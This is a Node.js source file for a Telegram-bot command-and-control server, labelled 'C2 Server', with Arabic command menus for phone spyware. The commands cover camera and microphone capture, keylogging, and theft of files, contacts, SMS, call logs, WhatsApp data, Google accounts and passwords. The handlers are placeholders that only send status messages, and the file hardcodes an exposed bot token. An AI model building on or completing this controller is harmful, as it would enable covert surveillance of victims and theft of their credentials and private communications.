const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = '7604669338:AAElI3Uy3cnB4rzmk5LTGHI3a5ws63ueYS0';
const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// الأوامر
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, `✅ *البوت يعمل بنجاح!*
📱 *الأوامر المتاحة:*
🎥 /camera_front
🎥 /camera_back
🎙️ /mic
📂 /files
📞 /contacts
✉️ /sms
📋 /call_logs
🔔 /notifications
⌨️ /keylog
👤 /google_accounts
💬 /whatsapp
🔑 /passwords
📍 /location
🖼️ /gallery
❓ /help`, { parse_mode: 'Markdown' });
});

bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, `📱 *الأوامر المتاحة:*
/start - عرض القائمة الرئيسية
/help - هذه القائمة
/camera_front - الكاميرا الأمامية
/camera_back - الكاميرا الخلفية
/mic - تسجيل صوت
/files - سحب الملفات
/contacts - جهات الاتصال
/sms - الرسائل النصية
/call_logs - سجل المكالمات
/notifications - مراقبة الإشعارات
/keylog - كيلوجر
/google_accounts - حسابات Google
/whatsapp - مراقبة واتساب
/passwords - كلمات المرور
/location - الموقع
/gallery - صور المعرض`, { parse_mode: 'Markdown' });
});

bot.onText(/\/camera_front/, (msg) => bot.sendMessage(msg.chat.id, '📸 جاري التقاط الصورة من الكاميرا الأمامية...'));
bot.onText(/\/camera_back/, (msg) => bot.sendMessage(msg.chat.id, '📸 جاري التقاط الصورة من الكاميرا الخلفية...'));
bot.onText(/\/mic/, (msg) => bot.sendMessage(msg.chat.id, '🎙️ جاري تسجيل الصوت...'));
bot.onText(/\/files/, (msg) => bot.sendMessage(msg.chat.id, '📂 جاري سحب الملفات...'));
bot.onText(/\/contacts/, (msg) => bot.sendMessage(msg.chat.id, '📇 جاري سحب جهات الاتصال...'));
bot.onText(/\/sms/, (msg) => bot.sendMessage(msg.chat.id, '✉️ جاري سحب الرسائل...'));
bot.onText(/\/call_logs/, (msg) => bot.sendMessage(msg.chat.id, '📞 جاري سحب سجل المكالمات...'));
bot.onText(/\/notifications/, (msg) => bot.sendMessage(msg.chat.id, '🔔 بدء مراقبة الإشعارات...'));
bot.onText(/\/keylog/, (msg) => bot.sendMessage(msg.chat.id, '⌨️ بدء تسجيل الضغطات...'));
bot.onText(/\/google_accounts/, (msg) => bot.sendMessage(msg.chat.id, '👤 جاري سحب حسابات Google...'));
bot.onText(/\/whatsapp/, (msg) => bot.sendMessage(msg.chat.id, '💬 بدء مراقبة واتساب...'));
bot.onText(/\/passwords/, (msg) => bot.sendMessage(msg.chat.id, '🔑 جاري سحب كلمات المرور...'));
bot.onText(/\/location/, (msg) => bot.sendMessage(msg.chat.id, '📍 جاري الحصول على الموقع...'));
bot.onText(/\/gallery/, (msg) => bot.sendMessage(msg.chat.id, '🖼️ جاري سحب الصور...'));

// نقطة استقبال Webhook
app.post(`/webhook/${BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

app.get('/', (req, res) => res.send('C2 Server is running and ready!'));

app.listen(PORT, () => console.log(`✅ C2 Server is running on port ${PORT}`));
